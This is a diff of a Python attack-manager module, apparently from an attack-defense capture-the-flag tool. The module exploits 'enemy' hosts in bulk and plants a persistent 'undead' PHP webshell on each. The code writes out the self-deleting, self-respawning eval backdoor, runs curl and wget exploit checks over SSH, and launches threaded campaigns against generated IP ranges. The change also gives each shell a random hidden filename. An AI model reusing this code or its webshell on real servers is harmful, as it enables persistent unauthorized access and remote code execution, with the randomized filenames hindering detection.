@@ -5,11 +5,14 @@ import json
 import threading
 import requests
 import base64
+import random
+import string
 from urllib.parse import quote
 
 class AttackManager:
-    def __init__(self, ssh_manager):
-        self.ssh = ssh_manager
+    def __init__(self, connection_manager, target_manager):
+        self.cm = connection_manager
+        self.tm = target_manager
         self.config_file = None
         self.enemy_config = {
             'network_template': '',  # e.g. "172.16.{x}.101"
@@ -19,19 +22,7 @@ class AttackManager:
         self.attack_log = []
         
         # Undead Shell Template (Base64 encoded to avoid syntax issues during transfer)
-        # Content:
-        # <?php
-        # ignore_user_abort(true);
-        # set_time_limit(0);
-        # unlink(__FILE__);
-        # $file = '.index.php';
-        # $code = '<?php if(md5($_POST["pass"])=="md5_of_pass"){@eval($_POST[a]);} ?>';
-        # while (1) {
-        #     if (!file_exists($file)) file_put_contents($file, $code);
-        #     usleep(50000);
-        # }
-        # ?>
-        self.undead_filename = ".index.php"
+        self.undead_filename = ".index.php" # Fallback default
 
     def init_app(self, app):
         self.config_file = os.path.join(app.config['BASE_DIR'], 'data', 'attack_config.json')
@@ -64,11 +55,12 @@ class AttackManager:
         self.save_config()
         return {'status': 'ok', 'config': self.enemy_config}
 
-    def generate_undead_shell(self, password):
+    def generate_undead_shell(self, password, filename=None):
         """生成不死马 Payload (PHP代码)"""
         # Hardcoded specific MD5 for demo or derived from password
         import hashlib
         pass_md5 = hashlib.md5(password.encode()).hexdigest()
+        fname = filename if filename else self.undead_filename
         
         # PHP Shell Code (to be written by undead process)
         # Note: Using 'a' as eval parameter for the implanted shell
@@ -79,7 +71,7 @@ class AttackManager:
 ignore_user_abort(true);
 set_time_limit(0);
 unlink(__FILE__);
-$file = '{self.undead_filename}';
+$file = '{fname}';
 $code = '{shell_content}';
 while (1) {{
     if (!file_exists($file)) file_put_contents($file, $code);
@@ -149,7 +141,7 @@ while (1) {{
                 print(f"DEBUG: Trying SSH curl: {cmd_curl}")
                 
                 try:
-                    output = self.ssh.execute(local_ip, port, cmd_curl) # Always connect via SSH port
+                    output = self.cm.execute(local_ip, port, cmd_curl) # Always connect via SSH port
                     if output and 'VULN_CONFIRMED' in output:
                         print(f"DEBUG: Verified local exploit via SSH (localhost:{p_try} curl): {uri}")
                         valid_uri = uri
@@ -160,7 +152,7 @@ while (1) {{
                         # --- Method B: wget ---
                         cmd_wget = f"wget -qO- --post-data \"{payload_key}={payload_val}\" http://127.0.0.1:{p_try}/{uri}"
                         print(f"DEBUG: Trying SSH wget: {cmd_wget}")
-                        output = self.ssh.execute(local_ip, port, cmd_wget)
+                        output = self.cm.execute(local_ip, port, cmd_wget)
                         if output and 'VULN_CONFIRMED' in output:
                             print(f"DEBUG: Verified local exploit via SSH (localhost:{p_try} wget): {uri}")
                             valid_uri = uri
@@ -193,8 +185,12 @@ while (1) {{
         # 2. Generate Enemy IPs
         enemy_ips = self._generate_enemy_ips(source_ip)
         
-        # 3. Generate Payload
-        payload_code = self.generate_undead_shell(password)
+        # 3. Generate Payload with Random Filename
+        # Generate random filename: .<6_chars>.php
+        rand_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+        shell_filename = f".{rand_suffix}.php"
+        
+        payload_code = self.generate_undead_shell(password, filename=shell_filename)
         # ... logic ...
         
         b64_code = base64.b64encode(payload_code.encode()).decode()
@@ -209,7 +205,7 @@ include($f);
 
         # 4. Launch asynchronously
         # Pass VALID_PORT instead of SOURCE_PORT
-        threading.Thread(target=self._run_campaign, args=(enemy_ips, valid_port, valid_uri, password, exploit_php)).start()
+        threading.Thread(target=self._run_campaign, args=(enemy_ips, valid_port, valid_uri, password, exploit_php, shell_filename)).start()
 
     def _generate_enemy_ips(self, my_ip):
         """
@@ -250,14 +246,14 @@ include($f);
             except: pass
         return ips
 
-    def _run_campaign(self, enemy_ips, port, uri, password, exploit_php):
-        print(f"Starting attack campaign against {len(enemy_ips)} targets...")
+    def _run_campaign(self, enemy_ips, port, uri, password, exploit_php, shell_filename):
+        print(f"Starting attack campaign against {len(enemy_ips)} targets... (Shell: {shell_filename})")
         
         for ip in enemy_ips:
-            self._attack_one(ip, port, uri, password, exploit_php)
+            self._attack_one(ip, port, uri, password, exploit_php, shell_filename)
             time.sleep(0.1) 
 
-    def _attack_one(self, ip, port, uri, password, exploit_php):
+    def _attack_one(self, ip, port, uri, password, exploit_php, shell_filename):
         url = f"http://{ip}:{port}/{uri}"
         target_info = self.enemy_config['targets'].get(ip, {'status': 'waiting', 'logs': []})
         
@@ -295,9 +291,9 @@ include($f);
                 print(f"[ATTACK FAILED] {ip}:{port} - {result}")
             
             # Verify Implantation?
-            # Try to connect to implanted shell: .index.php
+            # Try to connect to implanted shell: .<random>.php
             # Note: The shell is written to the CURRENT working directory of the vulnerable script.
-            # So if uri is 'include/shell.php', the shell is at 'include/.index.php'.
+            # So if uri is 'include/shell.php', the shell is at 'include/.<random>.php'.
             if success:
                 time.sleep(1)
                 
@@ -307,8 +303,8 @@ include($f);
                     base_dir = uri.rsplit('/', 1)[0] + '/'
                 
                 verify_uris = [
-                    f"{base_dir}{self.undead_filename}", # Same dir
-                    f"{self.undead_filename}" # Root dir (fallback)
+                    f"{base_dir}{shell_filename}", # Same dir
+                    f"{shell_filename}" # Root dir (fallback)
                 ]
                 
                 verified = False
@@ -346,7 +342,7 @@ include($f);
                      base_dir = ""
                      if '/' in uri:
                         base_dir = uri.rsplit('/', 1)[0] + '/'
-                     target_info['shell_uri'] = f"{base_dir}{self.undead_filename}"
+                     target_info['shell_uri'] = f"{base_dir}{shell_filename}"
 
         except Exception as e:
             target_info['status'] = 'failed'
